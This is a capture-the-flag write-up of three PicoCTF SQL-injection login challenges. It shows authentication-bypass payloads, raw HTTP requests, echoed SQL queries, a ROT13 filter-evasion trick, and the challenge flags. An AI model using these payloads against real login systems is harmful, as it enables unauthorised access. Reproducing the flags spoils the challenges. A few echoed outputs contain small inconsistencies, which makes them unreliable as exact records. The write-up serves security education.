---
title: "Irish-Name-Repo 1-3"
description: "A three-part SQLi series to teach basic SQL Injection and filter evasion."
date: 2025-09-09
category: "web"
author: "sealldev"
section: "PicoCTF"
tags: ["medium"]
---

# Irish-Name-Repo 1
> There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

Starting the challenge, we are given a simple web-server with some images of people and a hamburger menu:

{{< image src="/images/picoctf/irishnamerepo/mainpage1.png" alt="main page" >}}

Inside the hamburger menu is the following options:
- Close Menu
- Support
- Admin Login

Admin Login sounds good! We are presented with the following login page:

{{< image src="/images/picoctf/irishnamerepo/login1.png" alt="login page" >}}

As this login page has no creds, I presume we likely need to do SQLi!

I try a simple `' OR 1=1--` in the login page, which works as follows.

A typical query will look like this:
```sql
SELECT username,password FROM users WHERE username = 'admin' AND password = 'password';
```

This query is what would be expected if someone put `admin` as the username and `password` as the password. If we use our payload:
```sql
SELECT username,password FROM users WHERE username = '' OR 1=1--' AND password = '';
```

The query has been changed, the double-hyphen comments out the rest of the query removing the password check. The username is now checking if the username matches and empty string OR 1=1, and as 1 always equals 1 we select the first user in the users table.

We are now logged in!

Flag: `picoCTF{s0m3_SQL_c218b685}`

# Irish-Name-Repo 2
> There is a website running at https://jupiter.challenges.picoctf.org/problem/53751/. Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

Same case as the login page, but there is filtering!

I believe the filtering is for keywords like **OR**, so we need a way to do it without those keywords.

We could specify the username (which is likely `admin`) and then just comment out the rest of the query with a double-hyphen comment.

Payload: `admin'--`

Flag: `picoCTF{m0R3_SQL_plz_c34df170}`

# Irish-Name-Repo 3
> There is a secure website running at https://jupiter.challenges.picoctf.org/problem/54253/ or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

In this case we only have a password input, in our query though we have a `debug` parameter we can set to `1` and see the query!

- Before:
```http
POST /problem/54253/login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
<sliced for brevity>

password=%27--&debug=0
```
Response:
```html
<h1>Login failed.</h1>
```

- After:
```http
POST /problem/54253/login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
<sliced for brevity>

password=%27--&debug=1
```
Response:
```html
<pre>password: '--
SQL query: SELECT * FROM admin where password = ''--'
</pre><h1>Login failed.</h1>
```

So let's test with a simple `' OR 1=1--`
```html
<pre>password: ' OR 1=1 OR--
SQL query: SELECT * FROM admin where password = '' BE 1=1 BE--'
</pre>
```

`BE`? What's happening to our payload?

If we put in the alphabet what do we get?

```html
<pre>password: ' abcdefghiklmnopqrstuvwxyz --
SQL query: SELECT * FROM admin where password = '' nopqrstuvxyzabcdefghijklm --'
</pre>
```

Hm, it seems the alphabet has been **rotated** by 13, this is a Caesar cipher!

We can just return the result and it will rotate again back to the start (as the alphabet is 26 characters).
```html
<pre>password: ' nopqrstuvxyzabcdefghijklm --
SQL query: SELECT * FROM admin where password = '' abcdefghiklmnopqrstuvwxyz --'
</pre>
```

So, we can encode out payload with ROT13, or let it rotate it for us.

The final working payload:
```
' be 1=1--
```

Flag: `picoCTF{3v3n_m0r3_SQL_7f5767f6}`
